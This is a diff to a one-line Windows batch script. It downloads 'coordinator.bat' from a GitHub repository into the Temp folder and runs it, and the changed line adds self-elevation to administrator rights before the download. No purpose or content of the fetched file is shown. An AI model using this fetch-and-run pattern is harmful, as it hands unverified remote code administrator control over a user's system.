@@ -1,1 +1,1 @@
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/coordinator.bat', '%Temp%\coordinator.bat') }" & %Temp%\coordinator.bat
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b) & powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/coordinator.bat', '%Temp%\coordinator.bat') }" & %Temp%\coordinator.bat
